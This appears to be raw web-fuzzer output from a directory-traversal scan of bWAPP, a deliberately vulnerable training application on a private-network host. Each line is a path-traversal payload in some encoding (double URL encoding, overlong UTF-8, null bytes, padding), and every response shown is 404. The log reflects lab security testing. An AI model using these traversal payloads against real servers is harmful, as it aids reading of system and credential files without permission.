430,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html
433,404,9L,39W,http://192.168.1.86/bWAPP/..\..\{FILE};index.html
428,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html
439,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\..\{FILE};index.html
432,404,9L,39W,http://192.168.1.86/bWAPP/..\{FILE};index.html
436,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\{FILE};index.html
435,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\{FILE};index.html
445,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html
442,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c{FILE};index.html
438,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\{FILE};index.html
431,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html
427,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html
425,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f{FILE};index.html
414,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE};index.html
440,404,9L,39W,http://192.168.1.86/bWAPP/..%5c{FILE};index.html
386,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f{FILE};index.html
434,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\{FILE};index.html
429,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html
426,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html
366,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html
413,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f{FILE};index.html
361,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\{FILE}%00index.html
360,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\{FILE}%00index.html
374,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html
375,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html
371,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html
422,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html
419,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html
444,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c{FILE};index.html
443,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c{FILE};index.html
404,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html
447,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html
446,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html
410,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f{FILE};index.html
411,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f{FILE};index.html
405,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html
406,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html
448,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\{FILE};index.html
450,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\{FILE};index.html
459,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE};index.html
456,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c{FILE};index.html
455,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE};index.html
454,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE};index.html
451,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE};index.html
449,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\{FILE};index.html
437,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\{FILE};index.html
352,404,9L,39W,http://192.168.1.86/bWAPP/..%255c{FILE}%00index.html
458,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE};index.html
368,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c{FILE}%00index.html
462,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE};index.html
463,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE};index.html
457,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c{FILE};index.html
365,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html
373,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html
467,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c{FILE};index.html
464,404,9L,39W,http://192.168.1.86/bWAPP/..%255c{FILE};index.html
481,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c{FILE};index.html
466,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c{FILE};index.html
483,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html
484,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html
482,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html
478,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE};index.html
480,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c{FILE};index.html
479,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE};index.html
477,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE};index.html
474,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\{FILE};index.html
489,404,9L,39W,http://192.168.1.86/bWAPP/\../\../{FILE}
493,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../{FILE}
476,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE};index.html
490,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../{FILE}
497,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\{FILE}
496,404,9L,39W,http://192.168.1.86/bWAPP//..\{FILE}
498,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\{FILE}
499,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\{FILE}
500,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\{FILE}
501,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\{FILE}
502,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/..\{FILE}
503,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/..\/..\{FILE}
491,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../{FILE}
495,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../\../\../{FILE}
505,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
492,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../{FILE}
494,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../\../{FILE}
465,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c{FILE};index.html
468,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c{FILE};index.html
504,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
461,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE};index.html
460,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE};index.html
520,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
521,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
538,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../{FILE}
536,404,9L,39W,http://192.168.1.86/bWAPP/.../{FILE}
539,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../{FILE}
542,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../.../{FILE}
541,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../{FILE}
537,404,9L,39W,http://192.168.1.86/bWAPP/.../.../{FILE}
540,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../{FILE}
545,404,9L,39W,http://192.168.1.86/bWAPP/...\...\{FILE}
547,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\{FILE}
544,404,9L,39W,http://192.168.1.86/bWAPP/...\{FILE}
548,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\{FILE}
550,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\...\{FILE}
551,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\...\...\{FILE}
549,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\{FILE}
554,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../{FILE}
552,404,9L,39W,http://192.168.1.86/bWAPP/..../{FILE}
557,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../{FILE}
556,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../{FILE}
555,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../{FILE}
558,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../..../{FILE}
553,404,9L,39W,http://192.168.1.86/bWAPP/..../..../{FILE}
543,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../.../.../{FILE}
562,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\{FILE}
563,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\{FILE}
560,404,9L,39W,http://192.168.1.86/bWAPP/....\{FILE}
561,404,9L,39W,http://192.168.1.86/bWAPP/....\....\{FILE}
565,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\{FILE}
566,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\....\{FILE}
559,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../..../..../{FILE}
569,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../{FILE}
568,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../{FILE}
564,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\{FILE}
570,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../{FILE}
567,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\....\....\{FILE}
546,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\{FILE}
576,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\{FILE}
578,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\{FILE}
579,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\{FILE}
580,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\{FILE}
581,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\{FILE}
577,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\{FILE}
583,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\..\..\{FILE}
582,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\..\{FILE}
648,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f{FILE}
649,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f{FILE}
652,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
651,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f{FILE}
650,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f{FILE}
654,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
655,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
657,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/{FILE}
658,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
661,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
659,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
653,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
664,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f{FILE}
662,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
663,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
660,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
656,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/{FILE}
665,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
666,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
667,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
669,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
670,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
475,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE};index.html
668,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
678,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
677,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
673,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c{FILE}
671,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
676,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
681,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\{FILE}
680,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\{FILE}
685,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
674,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c{FILE}
675,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c{FILE}
686,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
687,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
684,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
688,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c{FILE}
672,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c{FILE}
698,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f{FILE}
700,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
693,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
695,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
696,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f{FILE}
703,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
697,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f{FILE}
694,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
692,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
702,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
683,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
682,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
699,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
691,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
679,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
701,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
689,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
690,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
473,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\{FILE};index.html
472,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\{FILE};index.html
487,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html
